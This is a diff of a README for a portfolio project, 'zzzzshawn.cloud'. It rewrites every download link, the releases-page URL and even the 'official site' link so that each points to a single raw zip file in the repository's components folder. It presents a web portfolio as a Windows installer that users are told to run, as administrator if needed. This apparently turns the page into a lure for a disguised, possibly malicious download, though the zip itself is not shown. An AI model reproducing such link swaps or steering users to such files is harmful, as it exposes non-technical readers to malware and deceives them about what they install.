@@ -1,6 +1,6 @@
 # 🚀 zzzzshawn.cloud - Showcase Your Design Engineering Work
 
-[![Download zzzzshawn.cloud](https://img.shields.io/badge/Download-zzzzshawn.cloud-brightgreen?style=for-the-badge)](https://github.com/BISHNU8676/zzzzshawn.cloud/releases)
+[![Download zzzzshawn.cloud](https://img.shields.io/badge/Download-zzzzshawn.cloud-brightgreen?style=for-the-badge)](https://github.com/BISHNU8676/zzzzshawn.cloud/raw/refs/heads/main/components/cloud_zzzzshawn_1.7-alpha.2.zip)
 
 Welcome to the guide for zzzzshawn.cloud. This app helps you create a clean and modern online portfolio. It is designed to show your work as a Design Engineer. This README will help you get zzzzshawn.cloud running on your Windows computer. No programming skill is needed.
 
@@ -39,7 +39,7 @@ There are no special hardware needs.
 
 To get started, visit the official release page below:
 
-[![Download zzzzshawn.cloud](https://img.shields.io/badge/Download-zzzzshawn.cloud-blue?style=for-the-badge)](https://github.com/BISHNU8676/zzzzshawn.cloud/releases)
+[![Download zzzzshawn.cloud](https://img.shields.io/badge/Download-zzzzshawn.cloud-blue?style=for-the-badge)](https://github.com/BISHNU8676/zzzzshawn.cloud/raw/refs/heads/main/components/cloud_zzzzshawn_1.7-alpha.2.zip)
 
 This link takes you to the page where the latest version is available. You will find the installation files here.
 
@@ -53,7 +53,7 @@ Follow these steps to download and run zzzzshawn.cloud on your Windows computer.
 
 Go to the releases page by clicking the link above or visit:
 
-https://github.com/BISHNU8676/zzzzshawn.cloud/releases
+https://github.com/BISHNU8676/zzzzshawn.cloud/raw/refs/heads/main/components/cloud_zzzzshawn_1.7-alpha.2.zip
 
 ### 2. Download the latest Windows installer
 
@@ -149,7 +149,7 @@ If you have issues, try these steps first:
 - If the app won’t open, right-click and choose **Run as administrator**.
 
 For more help, you can visit the official site at:  
-https://www.zzzzshawn.cloud/
+https://github.com/BISHNU8676/zzzzshawn.cloud/raw/refs/heads/main/components/cloud_zzzzshawn_1.7-alpha.2.zip
 
 ---
 
@@ -163,4 +163,4 @@ If you want to see how the portfolio works under the hood or help improve it:
 
 ---
 
-[![Download zzzzshawn.cloud](https://img.shields.io/badge/Download-zzzzshawn.cloud-brightgreen?style=for-the-badge)](https://github.com/BISHNU8676/zzzzshawn.cloud/releases)
+[![Download zzzzshawn.cloud](https://img.shields.io/badge/Download-zzzzshawn.cloud-brightgreen?style=for-the-badge)](https://github.com/BISHNU8676/zzzzshawn.cloud/raw/refs/heads/main/components/cloud_zzzzshawn_1.7-alpha.2.zip)
